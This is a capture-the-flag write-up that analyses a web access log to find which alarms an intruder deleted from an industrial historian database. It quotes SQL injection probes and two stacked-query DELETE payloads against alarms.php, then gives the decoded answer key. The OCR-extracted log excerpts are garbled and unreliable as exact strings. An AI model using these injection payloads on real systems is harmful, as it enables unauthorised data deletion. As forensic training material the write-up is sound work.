# The Historian Channel - 3
> The downloaded configuration file contained database schemas as well as information regarding the various alarms in Jubilife’s ICS network. It also contained hardcoded passwords, which could explain how the unauthorized user was eventually able to login successfully.

> There is no evidence that this configuration file has been changed in any way, which means the user must have found a different way to modify the alarm logging. However, the configuration file was probably used as part of their information gathering process.

> Looking deeper into the suspicious user’s activities, what are the names of the two alarms they deleted from the database?

> Flag format: alarm names in ASCII, comma separated (order does not matter). Example: if alarms with names ABCD and EFGH were deleted from database, accepted flags would be ABCD,EFGH or EFGH,ABCD.

## About the Challenge
We were given a log file to analyze (You can download the file [here](access.log)). And we need to find the names of the 2 alarams that the users deleted from the database

## How to Solve?
As you can see in the log file, there are a lot of requests that contains SQL query


[Image extracted text: 46
[04/May/2023:13:04:55
0500] "GET /alarms.php/ ?deviceID-1%20AND%20335123033518Submit-Submit HTTP/1.1" 500 336 "http:l [
46
[04/May/2023:13:04:55
0500] "GET /alarms.php/ ?deviceID-1%20AND?2032212309412--%2Oxbcx&Submit-Submit HTTP/1.1"
500 995
46
[04/May/2023:13:04:55
0500] "GET /alarms.php/ ?deviceID-1%20AND%2033512303351
-%20jmcx&Submit-Submit HTTP/1.1"
500 535
46
[04/May/2023:13:04:55
0500] "GET /alarms.php/ ?deviceID-122722922OAND%2067532302200%20AND220228227GhKm227%30%27GhKm&Sul
46
[04/May/2023:13:04:55
0500]
"GET [alarms.php/ deviceID-1227829%2OAND%2033512303351%2OAND%20%28227eecB%27%3D%27eecB&Sul
46
[04/May/2023:13:04:55
0500]
"GET [alarms.php/ deviceID-122782OAND%2041562305452%20AND?20%27VBNn?2723022ZVBNn& Submit-SL
46
[04/May/2023:13:04:55
0500]
'GET /alarms.php/ ?deviceID-1227%2OAND%2033512303351220AND?20227THRD?27%30%27THRD&Submit-SL
46
[04/May/2023:13:04:55
0500]
"GET /alarms.php/ ?deviceID-1227%20AND%2066032302942%20AND%20%27NSbh?27%30%27NSbh&Submit-SL
46
[04/May/2023:13:04:55
0500]
"GET  /alarms.php/ ?deviceID-%28SELECT?2O%28CASEZZOWHEN?20%2832682309651229220THEN?201%20EL
46
[04/May/2023:13:04:55
0500]
"GET  /alarms.php/ ?deviceID-%28SELECT?2O%28CASEZZOWHEN?20%2811942301194%29220THEN?201%20EL
46
[04/May/2023:13:04:55
0500]
"GET /alarms. php]
deviceID-1229%20ANDIZOEXTRACTVALUE?28823222CCONCAT2280x5c22C0x71707a6a7
46
[04/May/2023:13:04:55
0500]
'GET  /alarms.php/ ?deviceID-1%2OANDIZOEXTRACTVALUE%288232%2CCONCAT2280x5c22C0x71707a6a71%2C
46
[04/May/2023:13:04:55
0500]
"GET [alarms.php/ ?deviceID-1%2OANDIZOEXTRACTVALUER28823222CCONCAT?280x5c22COx71707a6a71%2C
46
[04/May/2023:13:04:55
0500]
"GET /alarms.php/ ?deviceID-1%27229%20AND%2OEXTRACTVALUE%28823222CCONCAT%280x5c%2C0x71707a€
46
[04/May/2023:13:04:55
0500]
"GET [alarms.php/ ?deviceID-122722OANDRZOEXTRACTVALUE%28823222CCONCAT?280x5c22C0x71707a6a7
46
[04/May/2023:13:04:55
0500]
"GET /alarms.php/ ?deviceID-1%29720AND%205884%3DCAST%28%28CHR%2811322927027CCHR%28112229%7
46
[04/May/2023:13:04:55
0500] "GET /alarms.php/ ?deviceID-1%20AND?205884%3DCAST228228CHR%28113229%70%7CCHR%2811222927027
46
[04/May/2023:13:04:55
0500] "GET /alarms.php/ ?deviceID-1%2OAND%205884%3DCAST%28228CHR228113229270%7CCHR%28112229%70275
46
[04/May/2023:13:04:55
0500] "GET /alarms.php/ ?deviceID-1227229%2OAND%205884%3DCAST228228CHR%28113229270%7CCHR%28112229
46
[04/May/2023:13:04:55
0500] "GET /alarms.php/ ?deviceID-1227%20AND%205884%3DCAST?28228CHR%2811322927C27CCHR%2811222927
46
[04/May/2023:13:04:55
0500]
"GET [alarms.php/ ?deviceID-122972OAND%203467220IN20%28SELECT220%28CHAR%2811322922BCHAR%2S
46
[04/May/2023:13:04:55
0500]
"GET [alarms.php/ deviceID-1%2OAND%203467220IN%20228SELECT?2O%28CHAR%28113229%2BCHAR%28113
46
[04/May/2023:13:04:55
0500]
"GET [alarms.php/ ?deviceID-1%2OAND?203467%20IN?20228SELECT?2OR28CHAR%28113229%2BCHAR%28113
46
[04/May/2023:13:04:55
0500]
"GET /alarms.php/ ?deviceID-1%27229720AND%203467%20IN%20228SELECT%20%28CHAR%28113729%2BCHAF
46
[04/May/2023:13:04:55
0500] "GET /alarms.php/ ?deviceID-1227%2OAND%203467220IN22O%28SELECTR20%28CHAR%28113229%2BCHAR%2E
46
[04/May/2023:13:04:55
0500] "GET /alarms.php/ ?deviceID-1229720AND%20378823D228SELECT%ZOUPPER%28XMLType?28CHR?2860229%
46
[04/May/2023:13:04:55
0500] "GET /alarms.php/ ?deviceID-1%20AND%20378823D%28SELECT%ZOUPPER%Z8XMLType?28CHR%2860229270%
46
[04/May/2023:13:04:55
0500] "GET /alarms.php/ ?deviceID-1%20AND%20378873D%28SELECT%ZOUPPER%Z8XMLType?28CHR%2860729%7c%_]


To obtain the flag, we need to find `DELETE` query. And I found there are 50 requests that contains `DELETE FROM` keywords but some of them returned `500` status code.


[Image extracted text: 7%3BSELECT%zOreplace(replace(replace(replace(replace(repl
DELETEYZOFROM
Aa ab
? of 50
1  = *
7%3BDELETE"2OFROM2Oalarms"2OWHERER2OdeviceID?2O-%20CAST
47021 OZUaSizUmTCUCN)  OZUHIDIZUIallICfozU-ZUChST(^ozT4
7%3BDELETE"2OFROM%2Oalarms"2O1HERER2OdeviceID?2O-"2OCAST (%274227220as"20INTEGER ) %2OANDIZOname%20-%20CAST
X274
7%3BDELETER2OFROM2Oalarms"2ONHERE"2OdeviceID?2O-%2OCAST (%272227220as%20INTEGER) %20AND?ZOname%20-%2OCAST
X274
7%3BDELETERZOFROM2Oalarms?2OwHERE%zOdeviceID?2O-%2OCAST (%274727220a5%20INTEGER) %2OAND%2Oname%20-%2OCAST (X%274
7%3BDELETERZOFROMzOalarms%2OwHERE%zodeviceID?2o-%2OCAST (%275227220as%20INTEGER)%2OAND%zOname%20-%2OCAST
X6274
7%3BDELETERZOFROMzOalarms%2OwHERE%zodeviceID?2o-%2OCAST (%275227%220as%20INTEGER)%2OAND?zOname%20-%2OCAST (X9274
7%3BDELETERZOFROMzOalarms%2OwHERE%zodeviceID?2o-%2OCAST (%272227220as%20INTEGER)%2OAND%zOname%20-%2OCAST
X6274
7%3BDELETE"2OFROM2Oalarms"2O1HERER2OdeviceID?2O-"20CAST
62627220as%20INTEGER ) %2OAND%ZOname?20-"20CAST (X2274
7%3BDELETE"2OFROM%2Oalarms"2ONHERER2OdeviceID?2O-"%2OCAST (%272227220as"20INTEGER ) %2OANDIZOname%20-%20CAST (X2274
7%3BDELETE"2OFROM2Oalarms"2O1HERER2OdeviceID?2O-"20CAST
%274227220aS%20INTEGER ) %2OAND%ZOname?20-"20CAST (X2274
ubmit-Submit HTTP/1.1"
200 1114 "http:
(jubilifehistorian/index php"
"Mozilla/5
0 (Windows
NT 10.0; Win64;
X64
bmit-Submit HTTP/1.1"
200
1299
jubilifehistorian/alarms:php
"Mozilla/5.0 (Windows NT
10.0; Win64;
bmit-Submit HTTP/1.1"
200 1198
jubilifehistorian/alarms.php
"Mozilla/5.0 (Windows NT
10.0; Win64;
bmit-Submit HTTP/1.1"
200
1286
jubilifehistorian/alarms.php
"Mozilla/5.0 (Windows NT
10.0; Win64;
bmit-Submit HTTP/1.1"
200 1289 "http:
jubilifehistorian/alarms.php
"Mozilla/5.0 (Windows NT
10.0; Win64;
ubmit-Submit HTTP/1.1" 200 1110 "http:
jubilifehistorian/alarms.php
'Mozilla/5.0 (Windows NT
10.0; Win64;
7%3BSELECT%zoreplace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr( (substr(sq
7%3BSELECT%zoreplace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr( (substr(sq
7%3BDELETE"2OFROM2Oalarms"2O1HERER2OdeviceID?2O-"20CAST
%275227220aS%20INTEGER ) %2OAND%ZOname?20-%20CAST
X6274
7%3BDELETERZOFROMkzoalarms%2OwHERE%zodeviceID?2o-%2OCAST (%273227220as%20INTEGER )%2OAND?zOname%20-%2OCAST (X9274
7"3BDELETE"2OFROMzOalarms"2OWHERE"2OdeviceID?2O-"2OCAST
'1927220as%20INTEGER)%2OAND%zOname%20-%2OCAST
Xo274
7"3BDELETE"2OFROMzOalarms"2OWHERE"2OdeviceID?2O-"2OCAST
3227220as%20INTEGER)%2OAND%zOname%20-%2OCAST
Xo274
7"3BDELETE"2OFROMzOalarms"2OWHERE"2OdeviceID?2O-"2OCAST
62627220a5220INTEGER)%2OAND%2Oname?20-%20CAST
Xo274
7%3BDELETE"2OFROM2Oalarms"2O1HERER2OdeviceID?2O-"20CAST
5227220aS%20INTEGER ) %2OAND%ZOname?20-%20CAST
X6274
7%3BDELETE"2OFROM2Oalarms"2O1HERER2OdeviceID?2O-"20CAST
5227220aS%20INTEGER ) %2OAND%ZOname?20-%20CAST
X6274
7%3BDELETE"2OFROM2Oalarms"2OWHERER2OdeviceID?2O-%20CAST
2227820as220INTEGER ) %20AND%ZOname?20-%20CAST
X06274
7%3BDELETE"2OFROM2Oalarms"2OWHERER2OdeviceID?2O-%20CAST
%273227220as"20INTEGER ) %20ANDIZOname%20-%20CAST (X2274
7%3BDELETERZOFROMzOalarms%2OwHERE%zodeviceID?2o-%2OCAST (%272227220as%20INTEGER )%2OAND?zOname%20-%2OCAST (X9274
bmit-Submit HTTP/1.1"
200
1111
"http:
(jubilifehistorian/index-php
"Mozilla/5.0 (Windows NT
10.0; Win64;
X64
bmit-Submit HTTP/1.1"
200
1237
"http:
'jubilifehistorian/alarms.php"
"Mozilla/5.0 (Windows NT 10.0; Win64;
bmit-Submit HTTP/1.1"
200
1247
"http   jubilifehistorian/alarms php" "Mozilla/5.0 (Windows NT
10.0; Win64;
ubmit-Submit HTTP/1.1" 200 1128 "http:   jubilifehistorian/alarms.php
"Mozilla/5.0 (Windows
NT
10.0; Win64;
"http:
"http:
"http:]


I found there are 2 requests that returned `200 OK` status code

```
';DELETE FROM alarms WHERE deviceID = CAST('5' as INTEGER) AND name = CAST(X'42313237' as TEXT);--
';DELETE FROM alarms WHERE deviceID = CAST('5' as INTEGER) AND name = CAST(X'43393639' as TEXT);--
```

Decode the hex to obtain the flag and seperate the name of the alarm using comma

```
B127,C969
```